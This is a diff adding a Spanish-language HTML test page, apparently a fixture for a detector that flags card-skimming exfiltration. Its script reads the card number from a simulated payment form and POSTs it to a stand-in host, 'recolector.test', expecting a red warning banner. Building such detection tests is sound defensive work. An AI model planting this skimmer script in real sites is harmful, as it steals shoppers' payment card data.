@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="es">
+<head><meta charset="UTF-8"><title>Prueba: skimmer de tarjeta</title></head>
+<body style="font: 15px/1.5 system-ui, sans-serif; max-width: 700px; margin: 40px auto;">
+  <h1>💳 Prueba: robo de tarjeta (skimmer)</h1>
+  <p><b>Esperado:</b> al pulsar el botón, un número de tarjeta viaja a un dominio
+     externo (+90) → banner ROJO. Es la variante grave de la exfiltración.</p>
+  <p>El número <code>4111 1111 1111 1111</code> es el de prueba de Visa (no es real
+     y pasa el algoritmo de Luhn). El destino <code>recolector.test</code> no resuelve.</p>
+  <hr>
+
+  <form onsubmit="return false" style="border:1px solid #ccc; padding:16px; border-radius:8px; max-width:340px;">
+    <p><label>Número de tarjeta<br>
+      <input id="card" autocomplete="cc-number" name="cardnumber" value="4111 1111 1111 1111"></label></p>
+    <button type="button" id="go">Pagar (simulado)</button>
+  </form>
+  <p id="msg" style="color:#b0281a;"></p>
+
+  <script>
+    document.getElementById("go").addEventListener("click", () => {
+      const card = document.getElementById("card");
+      card.dispatchEvent(new Event("input", { bubbles: true }));
+      setTimeout(() => {
+        const digits = card.value.replace(/\s/g, "");
+        fetch("http://recolector.test/pay", { method: "POST", body: "pan=" + digits }).catch(() => {});
+        document.getElementById("msg").textContent = "Enviado (falla adrede). Comprueba el banner rojo.";
+      }, 400);
+    });
+  </script>
+
+  <p><a href="/index.html">← Volver al índice</a></p>
+</body>
+</html>
